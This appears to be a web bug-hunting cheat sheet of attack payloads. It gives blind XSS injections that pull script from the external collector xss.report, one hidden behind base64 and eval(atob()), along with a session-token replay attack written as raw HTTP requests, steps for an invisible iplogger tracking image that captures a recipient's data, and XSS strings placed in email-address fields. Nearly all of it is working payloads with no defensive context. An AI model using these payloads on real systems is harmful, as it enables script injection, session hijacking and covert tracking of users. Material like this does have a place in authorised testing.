---
tags:
  - web_hunting
---
- Blind XSS
    
    ```python
    '"><script src=//xss.report/s/M8SZT8></script>
    "><img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Ii8veHNzLnJlcG9ydC9zL004U1pUOCI7ZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChhKTs&#61; onerror=eval(atob(this.id))>
    # Using Burp Collaborator
    <https://medium.com/@jr.mayank1999/exploiting-blind-xss-with-burp-collaborator-client-fec38b5fc5e>
    ```
    
- Replay Attacks
    
    ```python
    # Try token Re-Use
    # U send Message 
    PUT /v1/api/messages/send?token=RWFzdGVyIGVnZyEgWW91RhdGEg=
    HTTP/1.1
    Host: vulnlab.com
    Content-Type: application/json
    {‘msg’: ‘Hi there! I will meet you at my place at 9pm today..’}
    
    --------------------------------------
    # U Then logout
    GET /v1/api/messages/logout?token=RWFzdGVyIGVnZyEgWW91RhdGEg=
    HTTP/1.1
    Host: vulnlab.com
    Content-Type: application/json 
    ---------------------------------------------------------
    We can then try to resend the request multiple times using the old token but with
    different messages.
    
    If the request was successful and no different status code was returned, it means
    we are able to flood the application using the session data of an old user.
    ```
    
- Markup Language? try **Create A picture that steals Data**
    
    ```python
    Go to <https://iplogger.org/>
    choose invisible image 
    send the message 
    ```
    
    [](https://medium.com/@iframe_h1/a-picture-that-steals-data-ff604ba1012)[https://medium.com/@iframe_h1/a-picture-that-steals-data-ff604ba101](https://medium.com/@iframe_h1/a-picture-that-steals-data-ff604ba101)
    

- **XSS in email section**
    
    ```jsx
    "hello<form/><!><details/open/ontoggle=alert(1)>"@gmail.com
    ["');alert('XSS');//"]@xyz.xxx
    “><svg/onload=confirm(1)>”@x.y
    “><svg/onload=confirm(1)>”@x.y
    test@gmail.com%27\\%22%3E%3Csvg/onload=alert(/xss/)%3E
    
    ```
    

